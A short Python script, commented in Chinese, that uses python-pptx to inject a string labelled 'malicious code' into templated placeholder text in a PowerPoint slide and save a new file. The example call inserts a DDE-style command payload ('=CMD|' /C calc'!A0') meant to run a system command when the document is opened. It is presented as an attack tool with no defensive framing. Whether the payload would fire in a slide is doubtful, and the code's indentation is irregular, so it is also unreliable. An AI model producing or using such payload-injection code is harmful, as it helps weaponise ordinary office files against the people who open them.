from pptx import Presentation

   def template_injection(file_path, slide_index, malicious_code):
       prs = Presentation(file_path)
       slide = prs.slides[slide_index]

       for shape in slide.shapes:
           if shape.has_text_frame:
               text_frame = shape.text_frame
               for paragraph in text_frame.paragraphs:
                   runnable_text = paragraph.text
                   if runnable_text.startswith('{{') and runnable_text.endswith('}}'):
                       paragraph.text = f'{runnable_text}{malicious_code}'

       prs.save('output.pptx')

   # 呼叫程式碼並指定要插入的惡意程式碼和要修改的投影片索引
   template_injection('template.pptx', 0, '=CMD|\' /C calc\'!A0')